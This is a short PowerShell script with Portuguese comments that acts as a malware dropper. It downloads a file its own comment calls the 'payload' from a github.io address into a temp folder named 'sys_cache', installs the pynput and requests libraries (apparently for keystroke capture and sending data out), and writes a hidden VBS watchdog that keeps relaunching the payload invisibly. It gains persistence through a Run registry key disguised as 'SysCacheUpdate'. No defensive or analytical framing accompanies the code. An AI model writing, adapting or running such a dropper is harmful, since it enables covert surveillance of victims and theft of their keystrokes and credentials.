$dir = "$env:TEMP\sys_cache"
if (!(Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force }

# Baixa o payload
Invoke-WebRequest -Uri "https://seu-usuario.github.io/sys-cache-update/sys_cache.py" -OutFile "$dir\sys_cache.py"

# Tenta instalar as bibliotecas
python -m pip install pynput requests --quiet

# Guardião VBS Inteligente (Evita múltiplos processos pythonw.exe)
$vbs = @"
Set WshShell = CreateObject("WScript.Shell")
Do
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set colProcesses = objWMIService.ExecQuery("Select * from Win32_Process Where Name = 'pythonw.exe'")
    If colProcesses.Count = 0 Then
        WshShell.Run "pythonw.exe $dir\sys_cache.py", 0, False
    End If
    WScript.Sleep 30000
Loop
"@
$vbs | Out-File -FilePath "$dir\guardiao.vbs" -Encoding ASCII

# Registro de inicialização
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $regPath -Name "SysCacheUpdate" -Value "wscript.exe $dir\guardiao.vbs"

# Inicia agora
Start-Process "wscript.exe" "$dir\guardiao.vbs"
